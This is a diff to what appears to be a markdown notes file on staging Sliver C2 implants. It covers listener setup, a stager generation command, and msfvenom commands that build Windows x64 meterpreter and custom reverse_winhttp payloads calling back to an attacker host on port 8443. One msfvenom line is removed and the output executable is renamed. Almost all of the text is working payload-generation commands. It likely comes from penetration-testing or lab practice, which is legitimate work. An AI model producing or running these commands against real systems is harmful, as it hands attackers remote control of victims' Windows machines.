@@ -37,12 +37,9 @@ mtls -l 443
 stage-listener --url http://ip:8443 --profile win-shellcode --prepend-size
 
 generate stager --lhost ip --lport 8443 --protocol http 
-# this will likely not work so try the following:
 
-msfvenom --platform windows --arch x64 --format csharp --payload windows/x64/meterpreter/reverse_http LHOST=tun0 LPORT=8443 EXITFUNC=thread
-
-
+# the above will likely not work so try the following:
 # Adjust the format as needed, common formats: exe, raw, csharp, vbapplication. x86 for macros
-msfvenom -a x64 -p windows/x64/custom/reverse_winhttp LHOST=192.168.122.1 LPORT=8443 LURI=/payload.woff -f exe -o msfstager.exe EXITFUNC=thread
+msfvenom -a x64 -p windows/x64/custom/reverse_winhttp LHOST=tun0 LPORT=8443 LURI=/payload.woff -f exe -o sliverstage.exe EXITFUNC=thread
 ```
 
